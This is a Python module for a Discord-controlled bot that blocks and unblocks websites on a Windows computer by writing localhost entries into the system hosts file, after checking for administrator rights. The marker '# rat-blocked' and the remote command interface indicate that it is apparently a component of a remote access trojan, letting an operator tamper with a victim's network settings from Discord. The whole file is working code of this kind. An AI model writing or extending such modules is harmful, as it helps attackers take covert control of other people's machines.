"""Block and unblock websites through the Windows hosts file."""

import asyncio
import ctypes
from pathlib import Path
from urllib.parse import urlparse

from discord.ext import commands
from discord.ext.commands import Context

# The hosts file of Windows maps host names to addresses.
HOSTS_FILE = Path(r"C:\Windows\System32\drivers\etc\hosts")

# Marker written in front of every entry this module adds.
BLOCK_MARKER = "# rat-blocked"


def hosts_file_path() -> Path | None:
    """Return the path of the hosts file when it exists."""
    if HOSTS_FILE.exists():
        return HOSTS_FILE

    return None


def is_admin() -> bool:
    """Tell whether the bot runs with administrator rights."""
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception as exc:
        print(f"Admin check error: {exc}")
        return False


def host_name(url: str) -> str:
    """Extract the host name out of a URL or a bare host name."""
    cleaned = url.strip().strip('"').strip().lower()

    if not cleaned:
        return ""

    # A bare host name has no scheme, so the parser needs one.
    if "//" not in cleaned:
        cleaned = f"//{cleaned}"

    return (urlparse(cleaned).hostname or "").strip()


def is_marker_line(line: str, host: str) -> bool:
    """Tell whether a line is the marker of a blocked host."""
    if BLOCK_MARKER not in line:
        return False

    return host in line.lower().replace(",", " ").split()


def is_mapping_line(line: str, host: str) -> bool:
    """Tell whether a line maps the host name to an address."""
    content = line.split("#", 1)[0].strip()

    if not content:
        return False

    parts = content.split()

    return len(parts) >= 2 and parts[1].lower() == host


def read_lines(path: Path) -> list[str]:
    """Read the lines of the hosts file."""
    content = path.read_text(encoding="utf-8", errors="replace")

    return content.splitlines(keepends=True)


def write_lines(path: Path, lines: list[str]) -> None:
    """Write the lines back into the hosts file."""
    path.write_text("".join(lines), encoding="utf-8")


def is_blocked(lines: list[str], host: str) -> bool:
    """Tell whether the host is already blocked in the hosts file."""
    return any(
        is_marker_line(line, host) or is_mapping_line(line, host)
        for line in lines
    )


def add_block(lines: list[str], host: str) -> list[str]:
    """Add the blocked entry of a host to the lines of the hosts file."""
    updated = list(lines)

    if updated and not updated[-1].endswith("\n"):
        updated[-1] += "\n"

    updated.append(f"{BLOCK_MARKER} {host}\n")
    updated.append(f"127.0.0.1 {host}\n")

    return updated


def remove_block(lines: list[str], host: str) -> tuple[list[str], int]:
    """Remove the blocked entry of a host from the lines of the hosts file."""
    kept: list[str] = []
    removed = 0
    index = 0

    while index < len(lines):
        line = lines[index]

        if is_marker_line(line, host):
            removed += 1
            index += 1

            # The address line behind the marker belongs to the same entry.
            if index < len(lines) and is_mapping_line(lines[index], host):
                removed += 1
                index += 1

            continue

        kept.append(line)
        index += 1

    return kept, removed


async def block_website(ctx: Context[commands.Bot], url: str) -> None:
    """Point a host name to localhost in the hosts file."""
    if not is_admin():
        await ctx.reply(
            "Administrator rights are required to change the hosts file."
        )
        return

    hosts = hosts_file_path()

    if hosts is None:
        await ctx.reply("Could not find the hosts file of this computer.")
        return

    host = host_name(url)

    if not host:
        await ctx.reply("Please give a host name or a full URL.")
        return

    try:
        lines = await asyncio.to_thread(read_lines, hosts)

        if is_blocked(lines, host):
            await ctx.reply(f"`{host}` is already blocked.")
            return

        updated = add_block(lines, host)

        await asyncio.to_thread(write_lines, hosts, updated)
    except OSError as exc:
        print(f"Hosts file error: {exc}")
        await ctx.reply(f"Could not change the hosts file: {exc}")
        return

    await ctx.reply(f"Blocked `{host}`.")


async def unblock_website(ctx: Context[commands.Bot], url: str) -> None:
    """Remove the blocked entry of a host name from the hosts file."""
    if not is_admin():
        await ctx.reply(
            "Administrator rights are required to change the hosts file."
        )
        return

    hosts = hosts_file_path()

    if hosts is None:
        await ctx.reply("Could not find the hosts file of this computer.")
        return

    host = host_name(url)

    if not host:
        await ctx.reply("Please give a host name or a full URL.")
        return

    try:
        lines = await asyncio.to_thread(read_lines, hosts)
        updated, removed = remove_block(lines, host)

        if not removed:
            await ctx.reply(f"`{host}` is not blocked.")
            return

        await asyncio.to_thread(write_lines, hosts, updated)
    except OSError as exc:
        print(f"Hosts file error: {exc}")
        await ctx.reply(f"Could not change the hosts file: {exc}")
        return

    await ctx.reply(f"Unblocked `{host}`.")
